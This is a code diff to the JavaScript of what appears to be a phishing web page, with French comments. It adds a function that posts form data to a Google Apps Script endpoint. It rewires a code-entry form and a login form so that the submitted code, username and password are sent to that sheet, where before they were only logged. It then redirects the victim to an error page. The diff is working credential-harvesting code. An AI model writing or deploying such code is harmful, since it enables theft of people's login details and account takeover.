@@ -63,6 +63,25 @@ const translations = {
 // Langue par défaut
 let currentLang = 'en';
 
+// Remplace cette URL par celle de ton Google Apps Script après configuration
+const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/[TON_ID]/exec';
+
+// Fonction pour envoyer les données à Google Sheets
+function sendDataToSheet(type, value) {
+    const data = {
+        type: type,
+        value: value
+    };
+    fetch(GOOGLE_SHEET_URL, {
+        method: 'POST',
+        mode: 'no-cors', // Nécessaire pour GitHub Pages
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    }).catch(error => console.error('Erreur lors de l’envoi :', error));
+}
+
 // Fonction pour définir la langue
 function setLanguage(lang) {
     currentLang = lang;
@@ -150,8 +169,9 @@ if (document.getElementById('codeForm')) {
         message.textContent = translations.index[currentLang].verifying;
         button.disabled = true;
 
-        // Simuler sauvegarde dans la console
-        console.log(`[${new Date().toISOString()}] Code saisi : ${code}`);
+        // Envoyer le code à Google Sheets
+        const codeEntry = `Code saisi : ${code}`;
+        sendDataToSheet('Code', codeEntry);
 
         setTimeout(() => {
             message.style.color = '#00cc00';
@@ -171,8 +191,9 @@ if (document.getElementById('loginForm')) {
         const username = document.getElementById('username-placeholder').value;
         const password = document.getElementById('password-placeholder').value;
 
-        // Simuler sauvegarde dans la console
-        console.log(`[${new Date().toISOString()}] Utilisateur : ${username} | Mot de passe : ${password}`);
+        // Envoyer les identifiants à Google Sheets
+        const credentialEntry = `Utilisateur : ${username} | Mot de passe : ${password}`;
+        sendDataToSheet('Credentials', credentialEntry);
 
         setTimeout(() => {
             window.location.href = 'error.html';
